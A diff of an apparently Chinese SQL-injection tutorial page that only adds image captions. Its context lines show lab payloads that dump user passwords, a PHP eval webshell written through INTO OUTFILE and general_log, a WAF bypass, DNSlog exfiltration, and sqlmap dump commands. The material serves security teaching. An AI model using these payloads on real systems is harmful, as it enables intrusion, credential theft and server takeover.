@@ -186,7 +186,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,2 #
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250626115719525.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250626115719525&#34; href=&#34;http://picture.928330.xyz/typora/image-20250626115719525.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626115719525.png&#34; alt=&#34;image-20250626115719525&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -203,7 +203,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;database()&lt;/code&gt; 是mysql内置函数，当数据库执行到它时，会将其替换为当前正在使用的数据库的名称&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250626135800624.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250626135800624&#34; href=&#34;http://picture.928330.xyz/typora/image-20250626135800624.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626135800624.png&#34; alt=&#34;image-20250626135800624&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -253,7 +253,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250626142534142.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250626142534142&#34; href=&#34;http://picture.928330.xyz/typora/image-20250626142534142.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626142534142.png&#34; alt=&#34;image-20250626142534142&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -262,7 +262,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,table_name from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39; #
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250626142649062.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250626142649062&#34; href=&#34;http://picture.928330.xyz/typora/image-20250626142649062.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626142649062.png&#34; alt=&#34;image-20250626142649062&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -320,7 +320,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;users&amp;#39; and table_schema=database()#
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250706113907039.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250706113907039&#34; href=&#34;http://picture.928330.xyz/typora/image-20250706113907039.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250706113907039.png&#34; alt=&#34;image-20250706113907039&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -330,7 +330,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;users&amp;#39; #
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250626144509634.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250626144509634&#34; href=&#34;http://picture.928330.xyz/typora/image-20250626144509634.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626144509634.png&#34; alt=&#34;image-20250626144509634&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -341,7 +341,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select group_concat(user_id,first_name),group_concat(password) from users #
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250626145455797.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250626145455797&#34; href=&#34;http://picture.928330.xyz/typora/image-20250626145455797.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626145455797.png&#34; alt=&#34;image-20250626145455797&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -353,7 +353,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;users&amp;#39; limit 1,1 #
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627113327247.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250627113327247&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627113327247.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627113327247.png&#34; alt=&#34;image-20250627113327247&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -620,7 +620,7 @@
 &lt;p&gt;附上一张ascii码表：&lt;/p&gt;
 &lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/ascii-1-1.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;ASCII 表| 菜鸟教程&#34; href=&#34;http://picture.928330.xyz/typora/ascii-1-1.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/ascii-1-1.png&#34; alt=&#34;ASCII 表| 菜鸟教程&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -780,7 +780,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,load_file(&amp;#39;D:/WWW/1.txt&amp;#39;) #
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250707205449502.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250707205449502&#34; href=&#34;http://picture.928330.xyz/typora/image-20250707205449502.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250707205449502.png&#34; alt=&#34;image-20250707205449502&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -807,7 +807,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; into outfile &amp;#39;D:/WWW/114514.php&amp;#39; lines terminated by &amp;#39;&amp;lt;?php eval($_POST[kaka]); ?&amp;gt;&amp;#39; #
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250708141833937.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250708141833937&#34; href=&#34;http://picture.928330.xyz/typora/image-20250708141833937.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708141833937.png&#34; alt=&#34;image-20250708141833937&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -817,7 +817,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; into outfile &amp;#39;D:/WWW/114514.php&amp;#39; lines starting by &amp;#39;&amp;lt;?php eval($_POST[kaka]); ?&amp;gt;&amp;#39; #
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250708141731385.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250708141731385&#34; href=&#34;http://picture.928330.xyz/typora/image-20250708141731385.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708141731385.png&#34; alt=&#34;image-20250708141731385&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -827,7 +827,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; into outfile &amp;#39;D:/WWW/114514.php&amp;#39; fields terminated by &amp;#39;&amp;lt;?php eval($_POST[kaka]); ?&amp;gt;&amp;#39; #
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250708142123580.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250708142123580&#34; href=&#34;http://picture.928330.xyz/typora/image-20250708142123580.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708142123580.png&#34; alt=&#34;image-20250708142123580&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -843,7 +843,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;show variables like &amp;#39;%general%&amp;#39;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250708165305034.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250708165305034&#34; href=&#34;http://picture.928330.xyz/typora/image-20250708165305034.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708165305034.png&#34; alt=&#34;image-20250708165305034&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -854,7 +854,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set global general_log_file = &amp;#39;D:/WWW/114514.php&amp;#39;;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250708165642906.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250708165642906&#34; href=&#34;http://picture.928330.xyz/typora/image-20250708165642906.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708165642906.png&#34; alt=&#34;image-20250708165642906&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -877,7 +877,7 @@
 &lt;p&gt;以dnslog.cn为例，&lt;strong&gt;点击&lt;code&gt;Get SubDomain&lt;/code&gt;后，我们会得到一个独一无二的子域名&lt;/strong&gt;，例如：&lt;code&gt;624elh.dnslog.cn&lt;/code&gt;：
 
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250701173327303.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250701173327303&#34; href=&#34;http://picture.928330.xyz/typora/image-20250701173327303.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250701173327303.png&#34; alt=&#34;image-20250701173327303&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -892,7 +892,7 @@
 &lt;p&gt;这样，数据库名&lt;code&gt;&#39;dvwa&#39;&lt;/code&gt;就作为子域名的一部分，被成功地带到了外部，实现了数据泄露：&lt;/p&gt;
 &lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250701173610414.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250701173610414&#34; href=&#34;http://picture.928330.xyz/typora/image-20250701173610414.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250701173610414.png&#34; alt=&#34;image-20250701173610414&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -979,7 +979,7 @@
 &lt;p&gt;&lt;strong&gt;f12开发者工具（应用 -&amp;gt; cookie）：&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250701200225693.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250701200225693&#34; href=&#34;http://picture.928330.xyz/typora/image-20250701200225693.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250701200225693.png&#34; alt=&#34;image-20250701200225693&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -987,7 +987,7 @@
 &lt;p&gt;&lt;strong&gt;浏览器扩展（比如cookie editor）：&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250701200301860.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250701200301860&#34; href=&#34;http://picture.928330.xyz/typora/image-20250701200301860.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250701200301860.png&#34; alt=&#34;image-20250701200301860&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -1031,7 +1031,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39;/**/union/**/select/**/1,database()#
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250628203003878.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250628203003878&#34; href=&#34;http://picture.928330.xyz/typora/image-20250628203003878.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250628203003878.png&#34; alt=&#34;image-20250628203003878&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -1118,7 +1118,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;WAF会把它看成&amp;quot;带有奇怪符号的注释&amp;quot;而放行，但是到了mysql环境里，就能被执行：&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250629194535907.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250629194535907&#34; href=&#34;http://picture.928330.xyz/typora/image-20250629194535907.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250629194535907.png&#34; alt=&#34;image-20250629194535907&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -1165,7 +1165,7 @@
 &lt;p&gt;附上一张url编码表：&lt;/p&gt;
 &lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/194720-20200610165300516-237246127.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;URL编码表&#34; href=&#34;http://picture.928330.xyz/typora/194720-20200610165300516-237246127.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/194720-20200610165300516-237246127.png&#34; alt=&#34;URL编码表&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -1493,7 +1493,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; --batch
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627092400221.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250627092400221&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627092400221.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627092400221.png&#34; alt=&#34;image-20250627092400221&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -1512,7 +1512,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; --dbs --batch
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627093550491.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250627093550491&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627093550491.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627093550491.png&#34; alt=&#34;image-20250627093550491&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -1521,7 +1521,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; --current-db --batch
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627093857366.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250627093857366&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627093857366.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627093857366.png&#34; alt=&#34;image-20250627093857366&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -1533,7 +1533,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; -D cms --tables  --batch
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627094523174.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250627094523174&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627094523174.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627094523174.png&#34; alt=&#34;image-20250627094523174&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -1545,7 +1545,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; -D cms -T cms_users --columns  --batch
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627094938971.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250627094938971&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627094938971.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627094938971.png&#34; alt=&#34;image-20250627094938971&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -1563,7 +1563,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; -D cms -T cms_users -C username,password --dump --batch
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627095213209.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250627095213209&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627095213209.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627095213209.png&#34; alt=&#34;image-20250627095213209&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -1573,7 +1573,7 @@
